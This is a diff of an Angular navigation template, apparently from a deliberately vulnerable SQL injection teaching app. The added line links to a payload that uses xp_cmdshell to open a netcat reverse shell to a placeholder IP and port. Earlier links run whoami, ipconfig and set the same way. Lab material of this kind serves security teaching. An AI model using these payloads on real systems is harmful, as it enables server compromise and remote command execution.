@@ -56,11 +56,12 @@
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'whoami\';--'}">Easy - whoami</a></li>
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'ipconfig\';--'}">Easy - ipconfig</a></li>
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'set\';--'}">Easy - set</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'nc <IP> <PORT> -e cmd.exe\';--'}">Easy - Reverse TCP Shell</a></li>
                     </ul>
                 </section>
             </section>
         </nav>
 
     </div>
-
+    
 </div>
